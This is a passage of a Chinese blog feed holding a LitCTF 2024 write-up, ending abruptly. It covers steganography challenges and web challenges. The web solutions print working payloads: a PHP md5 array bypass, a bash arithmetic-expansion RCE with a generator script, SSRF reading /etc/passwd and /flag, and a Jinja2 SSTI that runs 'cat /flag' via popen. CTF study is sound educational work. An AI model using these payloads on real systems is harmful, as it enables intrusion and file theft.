class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qmemcpy(v9, <span class=\"string\">&quot;AesMasterAesMast&quot;</span>, <span class=\"keyword\">sizeof</span>(v9));</span><br><span class=\"line\">v8[<span class=\"number\">0</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">v8[<span class=\"number\">1</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(v8, v17, <span class=\"number\">8uLL</span>);</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( k = <span class=\"number\">8</span>; k &lt;= <span class=\"number\">15</span>; ++k )</span><br><span class=\"line\">  *((_BYTE *)v8 + k) = <span class=\"number\">8</span>;</span><br><span class=\"line\">AES_set_encrypt_key(v9, <span class=\"number\">128LL</span>, v6);</span><br><span class=\"line\">AES_encrypt(v8, v7, v6);</span><br><span class=\"line\">hex_to_string(v7, <span class=\"number\">16LL</span>, v5);</span><br><span class=\"line\">v4[<span class=\"number\">0</span>] = <span class=\"number\">-43</span>;</span><br><span class=\"line\">v4[<span class=\"number\">1</span>] = <span class=\"number\">-28</span>;</span><br><span class=\"line\">v4[<span class=\"number\">2</span>] = <span class=\"number\">-19</span>;</span><br><span class=\"line\">v4[<span class=\"number\">3</span>] = <span class=\"number\">116</span>;</span><br><span class=\"line\">v4[<span class=\"number\">4</span>] = <span class=\"number\">-78</span>;</span><br><span class=\"line\">v4[<span class=\"number\">5</span>] = <span class=\"number\">-126</span>;</span><br><span class=\"line\">v4[<span class=\"number\">6</span>] = <span class=\"number\">-127</span>;</span><br><span class=\"line\">v4[<span class=\"number\">7</span>] = <span class=\"number\">35</span>;</span><br><span class=\"line\">v4[<span class=\"number\">8</span>] = <span class=\"number\">79</span>;</span><br><span class=\"line\">v4[<span class=\"number\">9</span>] = <span class=\"number\">-121</span>;</span><br><span class=\"line\">v4[<span class=\"number\">10</span>] = <span class=\"number\">-24</span>;</span><br><span class=\"line\">v4[<span class=\"number\">11</span>] = <span class=\"number\">58</span>;</span><br><span class=\"line\">v4[<span class=\"number\">12</span>] = <span class=\"number\">31</span>;</span><br><span class=\"line\">v4[<span class=\"number\">13</span>] = <span class=\"number\">-71</span>;</span><br><span class=\"line\">v4[<span class=\"number\">14</span>] = <span class=\"number\">-51</span>;</span><br><span class=\"line\">v4[<span class=\"number\">15</span>] = <span class=\"number\">121</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( <span class=\"built_in\">memcmp</span>(v7, v4, <span class=\"number\">0x10</span>uLL) )</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>​\t\t将数据提取出来之后一把梭了：</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/6a1fad2f2b884df483b3ecdad35e1bf6.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n",
            "tags": [
                "Game"
            ]
        },
        {
            "id": "http://blog.g01den.top/posts/4bf5e0ee.html",
            "url": "http://blog.g01den.top/posts/4bf5e0ee.html",
            "title": "【2024】LitCTF",
            "date_published": "2024-06-06T11:39:33.000Z",
            "content_html": "<h1 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc：</h1>\n<h2 id=\"1-涐贪恋和伱-甾7dé毎兮毎秒\"><a class=\"markdownIt-Anchor\" href=\"#1-涐贪恋和伱-甾7dé毎兮毎秒\">#</a> 1、涐贪恋和伱、甾―⑺dé 毎兮毎秒：</h2>\n<p>​\t题目描述：laosebi，无脑 LSB 隐写，全取最低位的 LSB 隐写，拿到 flag。有大佬直接<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT16c3RlZyZhbXA7c3BtPTEwMDEuMjEwMS4zMDAxLjcwMjA=\"> zsteg</span> 秒了，在这里提一下</p>\n<p><img data-src=\"https://img-blog.csdnimg.cn/direct/26e0013c62b2436084480bade59025b5.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"2-你说得对但__\"><a class=\"markdownIt-Anchor\" href=\"#2-你说得对但__\">#</a> 2、你说得对，但__</h2>\n<p>​\t下载下来是一个图片，通过 foremost 分离图片，得到四张图片，每一张都是一个二维码的一部分，拼出来扫一下就行了，完事儿：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;Genshin_St@rt!!&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-原铁启动\"><a class=\"markdownIt-Anchor\" href=\"#3-原铁启动\">#</a> 3、原铁，启动！</h2>\n<p>​\t好离谱的题，不过题目的提示很明显了，我没发现，我的问题，原铁，再加上题目描述，推测应该是原神和崩铁的通用字体，直接上网站里对照这来，<span class=\"exturl\" data-url=\"aHR0cHM6Ly9nZW5zaGluLnByby1pdmFuLmNvbS9nZW5zaGluZm9udHRyYW5zbGF0b3IvZGVtby8lRUYlQkMlOEMlRTYlOUMlODAlRTUlOTAlOEUlRTUlOEYlOTElRTclOEUlQjAlRTUlODklOEQlRTUlOEQlOEElRTklODMlQTglRTUlODglODYlRTYlOTglQUYlRTUlOEUlOUYlRTclQTUlOUUlRUYlQkMlOEMlRTUlOTAlOEUlRTUlOEQlOEElRTklODMlQTglRTUlODglODYlRTYlOTglQUYlRTUlQjQlQTklRTklOTMlODElRTclOUElODQlRTUlQUQlOTclRTQlQkQlOTMlRUYlQkMlOUE=\">https://genshin.pro-ivan.com/genshinfonttranslator/demo/，最后发现前半部分是原神，后半部分是崩铁的字体：</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;good_gamer&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-盯帧珍珠\"><a class=\"markdownIt-Anchor\" href=\"#4-盯帧珍珠\">#</a> 4、盯帧珍珠</h2>\n<p>​\t题目给了一张 jpg 图片，放到 010 里面发现文件头为 gif 格式的，修改后缀后使用工具分离得到一堆图片，在其中可以发现组成 flag 的部分（我的 010 出了问题，破解无效了，这里就不放照片了），然后是一个 gif 中间嵌套了几张分段的 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LitCTF&#123;You_are_really_staring_at_frames!&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"5-everywhere-we-go\"><a class=\"markdownIt-Anchor\" href=\"#5-everywhere-we-go\">#</a> 5、Everywhere We Go</h2>\n<p>​\t音频隐写，扔 Audacity 里面，频谱图里看到了 flag。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;Calculate_Step_By_Step&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web：</h1>\n<h2 id=\"1百万美元的诱惑\"><a class=\"markdownIt-Anchor\" href=\"#1百万美元的诱惑\">#</a> 1. 百万美元的诱惑：</h2>\n<p>​\t前面的题不会做，先看看这个。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;a&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;b&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$a</span> !== <span class=\"variable\">$b</span> &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$a</span>) == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$b</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$c</span>) &amp;&amp; <span class=\"variable\">$c</span> &gt; <span class=\"number\">2024</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;好康的&quot;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;干巴爹干巴爹先辈~&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;开胃小菜))&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">开胃小菜))</span><br></pre></td></tr></table></figure>\n<p>​\t看起来挺简单的，无脑数组绕过完事儿了：payload 如下</p>\n<blockquote>\n<p>?a[]=1&amp;b[]=2&amp;c[]=2025</p>\n</blockquote>\n<p>​\t获得下一个文件是./dollar.php。访问下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//flag in 12.php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;x&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$x</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;x&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/[a-z0-9;`|#&#x27;\\&quot;%&amp;\\x09\\x0a&gt;&lt;.,?*\\-=\\\\[\\]]/i&quot;</span>, <span class=\"variable\">$x</span>))&#123;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&quot;cat &quot;</span>.<span class=\"variable\">$x</span>.<span class=\"string\">&quot;.php&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<p>​\t突然意识到了个问题，这道题有点不一样，flag 所在的文件是 12.php，然后根据 rce 函数，看来是构造 12 这个数字，这就好办了，直接上 payload，payload 参考文章：</p>\n<p>：</p>\n<blockquote>\n<p>x=<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>((<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo stretchy=\"false\">(</mo><mtext> </mtext></mrow><annotation encoding=\"application/x-tex\">((~</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mopen\">(</span><span class=\"mspace nobreak\"> </span></span></span></span>(())))))))</p>\n</blockquote>\n<p>​\t解决了：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$flag</span>=<span class=\"string\">&quot;LitCTF&#123;dollar_d0llar_d0ll@r!!!&#125;&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t生成 payload 的脚本：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os.path</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def mult_times(str, m, n):</span><br><span class=\"line\">    front_len = m</span><br><span class=\"line\">    if front_len &gt; len(str):</span><br><span class=\"line\">        front_len = len(str)</span><br><span class=\"line\">    front = str[:front_len]</span><br><span class=\"line\"></span><br><span class=\"line\">    result = &#x27;&#x27;</span><br><span class=\"line\">    for i in range(n):</span><br><span class=\"line\">        result = result + front</span><br><span class=\"line\">    return result</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 构造参数</span><br><span class=\"line\">print(&quot;提示：$(($&#123;_&#125;))=0，$((~$(($&#123;_&#125;))))=-1&quot;)</span><br><span class=\"line\">print(&quot;请输入你要构造的数字&quot;)</span><br><span class=\"line\">n = int(input(&quot;构造的数字:&quot;))</span><br><span class=\"line\">yuanshi = mult_times(&#x27;$((~$(())))&#x27;, 11, n + 1)</span><br><span class=\"line\">fushu = mult_times(&#x27;$((~$(())))&#x27;, 11, n)</span><br><span class=\"line\">print(&quot;原始数据：&quot;, yuanshi)</span><br><span class=\"line\">q = &#x27;~$((&#x27;</span><br><span class=\"line\">p = &#x27;))&#x27;</span><br><span class=\"line\">print(&#x27;第一次取反结果为：&#x27;)</span><br><span class=\"line\">print(q + yuanshi + p)</span><br><span class=\"line\">FSQF = (q + fushu + p)</span><br><span class=\"line\">b = &#x27;$((~$((&#x27;</span><br><span class=\"line\">c = &#x27;))))&#x27;</span><br><span class=\"line\">ZX = &#x27;echo&#x27;</span><br><span class=\"line\">end = (ZX + &quot; &quot; + b + yuanshi + c)</span><br><span class=\"line\">FSQF2 = ZX + &quot; &quot; + q + fushu + p</span><br><span class=\"line\">print(&#x27;最后构造正数结果为：&#x27;)</span><br><span class=\"line\">print(end)</span><br><span class=\"line\">print(&#x27;最后构造负数结果为：&#x27;)</span><br><span class=\"line\">print(FSQF2)</span><br><span class=\"line\"># 结果写入</span><br><span class=\"line\">current_path = os.getcwd()</span><br><span class=\"line\">file_path = os.path.join(current_path, &#x27;RCE.sh&#x27;)</span><br><span class=\"line\">file_test = open(file_path, &#x27;w+&#x27;, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">file_test.write(end)</span><br><span class=\"line\">file_test.close()</span><br><span class=\"line\">current_path = os.getcwd()</span><br><span class=\"line\">file_path = os.path.join(current_path, &#x27;RCE2.sh&#x27;)</span><br><span class=\"line\">file_test = open(file_path, &#x27;w+&#x27;, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">file_test.write(FSQF2)</span><br><span class=\"line\">file_test.close()</span><br><span class=\"line\"># 进行判断</span><br><span class=\"line\">print(&quot;判断有效！输出正数数字为：&quot;)</span><br><span class=\"line\">os.system(&quot;chmod +x RCE.sh;bash RCE.sh&quot;)</span><br><span class=\"line\">print(&quot;判断有效！输出负数数字为：&quot;)</span><br><span class=\"line\">os.system(&quot;chmod +x RCE.sh;bash RCE2.sh&quot;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-浏览器也能套娃\"><a class=\"markdownIt-Anchor\" href=\"#2-浏览器也能套娃\">#</a> 2、浏览器也能套娃？</h2>\n<p>​\t提示我们输入一个 URL，猜测一下是 SSRF 漏洞，无脑传一个 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5iYWlkdS5jb20=\">http://www.baidu.com</span>，发现成功了，传下 file:///etc/passwd 发现能行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin utmp:x:100:406:utmp:/home/utmp:/bin/false nginx:x:101:101:nginx:/var/lib/nginx:/sbin/nologin </span><br></pre></td></tr></table></figure>\n<p>​\t直接读取根目录的 flag 文件，看看有没有，很明显有，payload file:///flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;9088fd46-7dbc-4235-9b88-4f81a53d0c89&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-一个池子\"><a class=\"markdownIt-Anchor\" href=\"#3-一个池子\">#</a> 3、一个… 池子？</h2>\n<p>​\t刚开始以为是 SQL 注入，结果抓包不小心看到了这个：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">HTTP/1.1</span> <span class=\"number\">404</span> NOT FOUND</span><br><span class=\"line\"><span class=\"attribute\">Server</span><span class=\"punctuation\">: </span>Werkzeug/3.0.3 Python/3.10.14</span><br><span class=\"line\"><span class=\"attribute\">Date</span><span class=\"punctuation\">: </span>Wed, 05 Jun 2024 08:52:31 GMT</span><br><span class=\"line\"><span class=\"attribute\">Content-Type</span><span class=\"punctuation\">: </span>text/html; charset=utf-8</span><br><span class=\"line\"><span class=\"attribute\">Content-Length</span><span class=\"punctuation\">: </span>207</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>close</span><br></pre></td></tr></table></figure>\n<p>​\t很显然是个 flask 框架，另外，我们输入什么，它跟着输出来了，推测可能是 ssti 漏洞，直接一把梭，或者一步步来，最终构造的 payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[137].__init__.__globals__[&#x27;popen&#x27;](&quot;cat+/flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t最后拿到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;f9c874a6-9276-470c-b37b-b999b23fee0e&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-高亮主题划掉背景查看器\"><a class=\"markdownIt-Anchor\" href=\"#4-高亮主题划掉背景查看器\">#</a> 4、高亮主题 (划掉) 背景查看器</h2>\n<p>​\t再用 hackbar 的时候，点了下 POST 方法，没想到看到了有意思的东西，就是 theme 